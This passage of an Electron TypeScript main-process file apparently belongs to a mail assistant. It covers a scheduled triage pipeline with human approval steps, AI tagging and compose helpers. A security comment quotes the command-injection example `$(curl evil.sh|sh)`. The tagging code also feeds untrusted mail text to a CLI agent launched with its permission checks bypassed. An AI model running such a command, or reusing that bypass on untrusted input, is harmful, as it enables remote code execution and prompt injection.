      timeoutMs: 90_000,
    });

    console.log('[generateReplyDraft] exit code:', result.exitCode, 'stdout length:', result.stdout.length);
    if (result.stderr) console.log('[generateReplyDraft] stderr:', result.stderr.slice(0, 500));

    if (result.exitCode !== 0) {
      return { status: 'error', draft: '', error: result.stderr || `プロセスがコード ${result.exitCode} で終了しました` };
    }
    if (result.text) {
      return { status: 'done', draft: result.text };
    }
    return { status: 'error', draft: '', error: 'CLIから応答がありませんでした' };
  }

  ipcMain.handle('generateReplyDraft', async (_event, params: {
    threadMessages: ThreadMessage[];
    mail: MailItem;
    instruction?: string;
    existingDraft?: string;
  }): Promise<{ status: string; draft: string; error?: string }> => {
    return generateReplyDraftImpl(params);
  });

  // --- Night Butler pipeline (自動パイプライン) ---

  const BUTLER_STATE_PATH = path.join(app.getPath('userData'), 'butler-state.json');
  const NIGHTLY_DIGEST_PATH = path.join(app.getPath('userData'), 'nightly-digest.json');

  function readJsonFile<T>(filePath: string): T | null {
    try {
      if (!fs.existsSync(filePath)) return null;
      return JSON.parse(fs.readFileSync(filePath, 'utf-8')) as T;
    } catch {
      return null;
    }
  }

  function writeJsonFile(filePath: string, data: unknown): void {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf-8');
  }

  // Note read/save reusing the same on-disk format as the getNote/saveNote IPC.
  function readNote(noteId: string): MailNote | null {
    ensureNotesDir();
    const filePath = path.join(NOTES_DIR, `${noteId.replace(/[^a-zA-Z0-9_-]/g, '_')}.json`);
    return readJsonFile<MailNote>(filePath);
  }

  function writeNote(note: MailNote): void {
    ensureNotesDir();
    const filePath = path.join(NOTES_DIR, `${note.id.replace(/[^a-zA-Z0-9_-]/g, '_')}.json`);
    writeJsonFile(filePath, note);
  }

  // Reversible IMAP move into the quarantine folder (creates folder if needed).
  async function moveToQuarantine(
    mailId: number,
    accountEmail: string,
    folderName: string,
  ): Promise<{ success: boolean; error?: string }> {
    const { moveToFolder } = await import('./services/imap-operations');
    const settings = loadSettings();
    const imapConfig = settings.imapConfigs.find((c) => c.accountEmail === accountEmail);
    if (!imapConfig?.credentials) {
      return { success: false, error: 'IMAP認証情報が未設定です' };
    }
    const res = await moveToFolder(mailId, accountEmail, imapConfig.credentials, folderName);
    return { success: res.success, error: res.error };
  }

  function buildPipelineDeps(): PipelineDeps {
    return {
      loadSettings,
      getMails,
      detectJunk: async (mails, apiKey) => {
        const s = loadSettings();
        const whitelist = s.junkWhitelistDomains ?? [];
        return apiKey
          ? detectJunkWithAI(mails, apiKey, whitelist)
          : detectJunkByKeywords(mails, whitelist);
      },
      triage: (mails, apiKey) => triageEmailsService(mails, apiKey),
      getThreadMessages: getThreadMessagesFromDb,
      generateReplyDraft: generateReplyDraftImpl,
      moveToQuarantine,
      getNote: readNote,
      saveNote: writeNote,
      butlerStatePath: BUTLER_STATE_PATH,
      digestPath: NIGHTLY_DIGEST_PATH,
      readJson: readJsonFile,
      writeJson: writeJsonFile,
    };
  }

  // Guard against overlapping runs (scheduler + manual trigger).
  let butlerRunning = false;

  async function executeButlerPipeline(opts?: { force?: boolean }): Promise<NightlyDigest> {
    if (butlerRunning) {
      const existing = readJsonFile<NightlyDigest>(NIGHTLY_DIGEST_PATH);
      return existing ?? {
        runAt: new Date().toISOString(),
        processedCount: 0,
        autoDone: [],
        awaitingApproval: [],
        errors: ['既にパイプラインが実行中です。'],
        costUsd: 0,
        running: true,
      };
    }
    butlerRunning = true;
    try {
      const digest = await runButlerPipeline(buildPipelineDeps(), opts);
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('digestUpdated', digest);
      }
      return digest;
    } finally {
      butlerRunning = false;
    }
  }
  // Exposed for the scheduler in app.whenReady().
  runButlerPipelineFromMain = executeButlerPipeline;

  ipcMain.handle('runButlerPipeline', async (_event, params?: { force?: boolean }): Promise<NightlyDigest> => {
    return executeButlerPipeline(params);
  });

  ipcMain.handle('getLatestDigest', (): NightlyDigest | null => {
    return readJsonFile<NightlyDigest>(NIGHTLY_DIGEST_PATH);
  });

  ipcMain.handle('approveButlerItem', async (_event, approval: ButlerApproval): Promise<{ status: string; error?: string }> => {
    const digest = readJsonFile<NightlyDigest>(NIGHTLY_DIGEST_PATH);
    if (!digest) return { status: 'error', error: 'ダイジェストが見つかりません' };

    // Locate the awaiting item.
    const idx = digest.awaitingApproval.findIndex(
      (e) =>
        e.mailId === approval.mailId &&
        e.accountEmail === approval.accountEmail &&
        ((approval.kind === 'delete' && e.kind === 'await_delete') ||
          (approval.kind === 'send' && e.kind === 'await_send')),
    );
    if (idx === -1) return { status: 'error', error: '対象の承認項目が見つかりません' };

    const item = digest.awaitingApproval[idx];
    let resultError: string | undefined;

    if (approval.approved) {
      if (approval.kind === 'delete') {
        // Safe line: deletion = move to Trash only (never permanent delete).
        try {
          const { moveToTrashBatch } = await import('./services/imap-operations');
          const settings = loadSettings();
          const imapConfig = settings.imapConfigs.find((c) => c.accountEmail === approval.accountEmail);
          if (!imapConfig?.credentials) {
            resultError = 'IMAP認証情報が未設定です';
          } else {
            const [res] = await moveToTrashBatch(
              [approval.mailId],
              approval.accountEmail,
              imapConfig.credentials,
              imapConfig.trashFolderPath,
            );
            if (!res.success) resultError = res.error;
          }
        } catch (err) {
          resultError = (err as Error).message;
        }
      } else if (approval.kind === 'send') {
        // Safe line: never auto-send. Open the compose form pre-filled with the draft.
        try {
          const toAddr = item.from.match(/<([^>]+)>/)?.[1] ?? item.from;
          const subject = item.subject.startsWith('Re:') ? item.subject : `Re: ${item.subject}`;
          await openMailComposeImpl({ to: toAddr, subject, body: item.draft ?? '' });
        } catch (err) {
          resultError = (err as Error).message;
        }
      }
    }

    // Remove the item from awaiting regardless (approved-and-acted, or rejected).
    if (!resultError) {
      digest.awaitingApproval.splice(idx, 1);
      writeJsonFile(NIGHTLY_DIGEST_PATH, digest);
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('digestUpdated', digest);
      }
      return { status: 'done' };
    }
    return { status: 'error', error: resultError };
  });

  // --- AI auto-tagging ---

  ipcMain.handle('autoTagMails', async (_event, params: {
    mails: { id: number; subject: string; preview: string; from: string }[];
    existingTags: Record<number, string[]>;
  }): Promise<Record<number, string[]>> => {
    const BATCH_SIZE = 30;
    const allResults: Record<number, string[]> = {};
    const mailBatch = params.mails.slice(0, BATCH_SIZE);

    if (!fs.existsSync(CLAUDE_CLI_PATH)) return allResults;

    const mailList = mailBatch.map((m, i) =>
      `${i + 1}. [ID:${m.id}] 件名: ${m.subject}\n   差出人: ${m.from}\n   プレビュー: ${(m.preview || '').slice(0, 200)}`
    ).join('\n\n');

    const tagSystemPrompt = `メール分類の専門家として、各メールに適切なタグを付けてください。
タグ: reply(要返信), action(要対応), hold(保留), done(対応済), unnecessary(不要), info(情報), urgent(至急)
判断基準:
- 自分への問いかけ・依頼 → reply
- 書類提出・手続き等 → action
- 期限切迫 → urgent
- CC・FYI → info
- 広告・spam → unnecessary
各メールに0-3個のタグを付与。JSONで出力。`;

    const prompt = `以下のメール一覧にタグを付けてください。

## 利用可能なタグ
- reply: 要返信
- action: 要対応
- hold: 保留
- done: 対応済
- unnecessary: 不要
- info: 情報
- urgent: 至急

## メール一覧
${mailList}

## 出力形式
各メールIDに対して0-3個のタグを推奨してください。JSON形式で出力:
{"results": {"メールID": ["tag1", "tag2"], ...}}

JSON以外の説明は不要です。`;

    const result = await spawnClaudeCli({
      prompt,
      args: [
        '--permission-mode', 'bypassPermissions',
        '--max-turns', '3',
        '--append-system-prompt', tagSystemPrompt,
      ],
      timeoutMs: 180_000,
    });

    if (result.exitCode !== 0) return allResults;

    try {
      const jsonMatch = result.text.match(/\{[\s\S]*"results"[\s\S]*\}/);
      if (jsonMatch) {
        const parsed = JSON.parse(jsonMatch[0]);
        if (parsed.results) {
          for (const [idStr, tags] of Object.entries(parsed.results)) {
            const mailId = Number(idStr);
            if (!isNaN(mailId) && Array.isArray(tags)) {
              allResults[mailId] = tags as string[];
            }
          }
        }
      }
    } catch {
      // Parse error — return empty
    }

    // Save tags to notes
    for (const [mailIdStr, tags] of Object.entries(allResults)) {
      const mailId = Number(mailIdStr);
      const mail = params.mails.find(m => m.id === mailId);
      if (!mail) continue;
      const noteFileName = `mail-${mailId}`;
      const notePath = path.join(NOTES_DIR, `${noteFileName}.json`);
      try {
        let note: { id: string; tags?: string[]; quickLabel?: string; [key: string]: unknown };
        if (fs.existsSync(notePath)) {
          note = JSON.parse(fs.readFileSync(notePath, 'utf-8'));
        } else {
          const now = new Date().toISOString();
          note = {
            id: noteFileName,
            mailId,
            accountEmail: '',
            subject: mail.subject,
            content: '',
            todos: [],
            tags: [],
            history: [{ timestamp: now, type: 'created', content: 'AIタグ付け' }],
            createdAt: now,
            updatedAt: now,
          };
        }
        note.tags = tags;
        note.updatedAt = new Date().toISOString();
        ensureNotesDir();
        fs.writeFileSync(notePath, JSON.stringify(note, null, 2), 'utf-8');
      } catch {
        // Skip individual errors
      }
    }

    return allResults;
  });

  // --- Open mail compose via mailto: ---

  // Extracted so approveButlerItem (send) can open the same compose form.
  async function openMailComposeImpl(params: {
    to: string;
    subject: string;
    body: string;
    cc?: string;
  }): Promise<void> {
    const parts: string[] = [];
    parts.push(`subject=${encodeURIComponent(params.subject)}`);
    parts.push(`body=${encodeURIComponent(params.body)}`);
    if (params.cc) {
      parts.push(`cc=${encodeURIComponent(params.cc)}`);
    }
    const mailto = `mailto:${encodeURIComponent(params.to)}?${parts.join('&')}`;
    await safeOpenExternal(mailto);
  }

  ipcMain.handle('openMailCompose', async (_event, params: {
    to: string;
    subject: string;
    body: string;
    cc?: string;
  }): Promise<void> => {
    await openMailComposeImpl(params);
  });

  // Open a specific mail in eM Client — single Swift helper handles everything
  ipcMain.handle('openMailInEmClient', async (_event, params: {
    subject: string;
    fromAddress?: string;
  }): Promise<{ success: boolean; error?: string; searchOpened?: boolean }> => {
    // Backup: always set clipboard so user can paste manually
    clipboard.writeText(params.subject);

    const helperPath = isDev
      ? path.join(__dirname, '..', 'resources', 'emclient-search')
      : path.join(process.resourcesPath, 'emclient-search');

    if (!fs.existsSync(helperPath)) {
      // No helper binary — just open eM Client
      try { execSync('open -a "eM Client"', { timeout: 5000 }); } catch { /* noop */ }
      return { success: true, searchOpened: false };
    }

    try {
      // SECURITY: pass arguments via execFileSync (no shell) so that a malicious
      // mail subject like `$(curl evil.sh|sh)` cannot trigger command injection.
      const args = [params.subject];
      if (params.fromAddress) {
        args.push('--from', params.fromAddress);
      }
      execFileSync(helperPath, args, { timeout: 15000 });
      return { success: true, searchOpened: true };
    } catch (err) {
      console.warn('[openMailInEmClient] helper failed:', (err as Error).message);
      // Fallback: just open eM Client (clipboard already has subject)
      try { execSync('open -a "eM Client"', { timeout: 5000 }); } catch { /* noop */ }
      return { success: true, searchOpened: false };
    }
  });
}

// --- userData migration from old app name ---
function migrateUserData(): void {
  const newDir = app.getPath('userData');
  const oldDir = path.join(path.dirname(newDir), 'eM Client Monitor');
  const marker = path.join(newDir, '.migrated');

  if (fs.existsSync(marker) || !fs.existsSync(oldDir)) return;

  console.log('[migration] Migrating userData from', oldDir, 'to', newDir);
  fs.mkdirSync(newDir, { recursive: true });

  const itemsToMigrate = ['settings.json', 'proposals', 'notes', 'todos', 'investigations', '.mcp.json'];
  for (const item of itemsToMigrate) {
    const src = path.join(oldDir, item);
    const dest = path.join(newDir, item);
    if (!fs.existsSync(src)) continue;
    if (fs.existsSync(dest)) continue;
    try {
      const stat = fs.statSync(src);
      if (stat.isDirectory()) {
        fs.cpSync(src, dest, { recursive: true });
      } else {
        fs.copyFileSync(src, dest);
      }
      console.log('[migration] Copied:', item);
    } catch (err) {
      console.warn('[migration] Failed to copy', item, ':', (err as Error).message);
    }
  }

  fs.writeFileSync(marker, new Date().toISOString(), 'utf-8');
  console.log('[migration] Done');
}

// --- App lifecycle ---
app.whenReady().then(() => {
  migrateUserData();
  ensureMcpConfig();

  // Global guard: any webContents created anywhere in the app (including the
  // calendar <webview>, which sets allowpopups) must not spawn in-app windows
  // and must not navigate to arbitrary external origins.
  app.on('web-contents-created', (_event, contents) => {
    contents.setWindowOpenHandler(({ url }) => {
      void safeOpenExternal(url);
      return { action: 'deny' };
    });
    // For the embedded webview, keep navigation confined to Google hosts.
    if (contents.getType() === 'webview') {
      contents.on('will-navigate', (event, url) => {
        try {
          const host = new URL(url).hostname;
          if (/(^|\.)google\.com$/i.test(host) || /(^|\.)gstatic\.com$/i.test(host) || /(^|\.)googleusercontent\.com$/i.test(host)) {
            return;
          }
        } catch { /* block */ }
        event.preventDefault();
        void safeOpenExternal(url);
      });
    }
  });

  registerIpcHandlers();
  createWindow();
  createTray();

  // Auto-check for updates on startup (after 5 seconds)
  setTimeout(async () => {
    try {
      const result = await (async () => {
        // Need to call the internal function after IPC handlers are registered
        const currentVersion = app.getVersion();
        let ghToken = '';
        try {
          ghToken = execSync('gh auth token', { encoding: 'utf-8', timeout: 5000 }).trim();
        } catch { /* */ }
        const headers: Record<string, string> = {
          Accept: 'application/vnd.github.v3+json',
          'User-Agent': 'Shirabe',
        };
        if (ghToken) headers['Authorization'] = `Bearer ${ghToken}`;
        const response = await fetch(
          'https://api.github.com/repos/lutelute/shirabe-mail/releases/latest',
          { headers },
        );
        if (!response.ok) return { hasUpdate: false };
        const release = await response.json() as {
          tag_name: string;
          body: string;
          assets: Array<{ name: string; url: string; size: number }>;
        };
        const latestVersion = release.tag_name.replace(/^v/, '');
        const pa = currentVersion.split('.').map(Number);
        const pb = latestVersion.split('.').map(Number);
        let hasUpdate = false;
        for (let i = 0; i < Math.max(pa.length, pb.length); i++) {
          const d = (pb[i] || 0) - (pa[i] || 0);
          if (d > 0) { hasUpdate = true; break; }
          if (d < 0) break;
        }
        if (!hasUpdate) return { hasUpdate: false };
        const dmg = release.assets.find((a) => a.name.endsWith('.dmg'));
        return {
          hasUpdate: true,
          currentVersion,
          latestVersion,
          releaseNotes: release.body || '',
          downloadUrl: dmg?.url ?? null,
          downloadSize: dmg?.size ?? null,
        };
      })();
      if (result.hasUpdate && mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('updateAvailable', result);
      }
    } catch { /* silent failure on auto-check */ }
  }, 5000);

  // --- Night Butler scheduler ---
  // butlerEnabled gates everything. schedule decides cadence:
  //   'startup' = once on launch, 'hourly'/'daily' = setInterval, 'manual' = nothing.
  try {
    const s = loadSettings();
    if (s.butlerEnabled && runButlerPipelineFromMain) {
      const run = runButlerPipelineFromMain;
      const sched = s.butlerSchedule;
      if (sched === 'startup' || sched === 'hourly' || sched === 'daily') {
        // Run shortly after launch so the window/IPC are ready.
        setTimeout(() => {
          void run().catch((err) =>
            console.warn('[butler] startup run failed:', (err as Error).message),
          );
        }, 15_000);
      }
      if (sched === 'hourly' || sched === 'daily') {
        const intervalMs = sched === 'hourly' ? 60 * 60 * 1000 : 24 * 60 * 60 * 1000;
        butlerScheduleTimer = setInterval(() => {
          void run().catch((err) =>
            console.warn('[butler] scheduled run failed:', (err as Error).message),
          );
        }, intervalMs);
      }
    }
  } catch (err) {
    console.warn('[butler] scheduler init failed:', (err as Error).message);
  }

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});
